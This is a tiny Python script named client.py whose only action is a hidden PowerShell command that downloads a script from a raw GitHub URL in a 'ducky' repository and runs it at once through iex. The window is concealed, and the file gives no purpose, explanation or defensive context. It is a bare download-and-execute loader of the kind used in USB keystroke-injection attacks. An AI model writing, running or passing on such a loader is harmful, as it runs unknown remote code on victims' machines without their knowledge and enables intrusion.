#!/usr/bin/python3
# client.py
# Ashish D'Souza
# January 3rd, 2018

import os

os.system("powershell -w h iex (new-object net.webclient).downloadstring(\\\"http://raw.githubusercontent.com/computer-geek64/ducky/master/d\\\")")
